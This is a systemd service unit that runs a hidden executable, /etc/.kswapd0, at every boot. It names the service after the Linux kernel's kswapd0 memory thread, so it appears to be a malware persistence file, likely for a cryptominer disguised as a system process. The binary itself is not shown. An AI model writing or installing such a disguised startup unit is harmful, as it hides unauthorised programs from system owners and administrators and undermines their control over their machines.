# kswapd0.service
[Unit]
Description=Kswapd0 Service

[Service]
ExecStart=/etc/.kswapd0
 

[Install]
WantedBy=multi-user.target
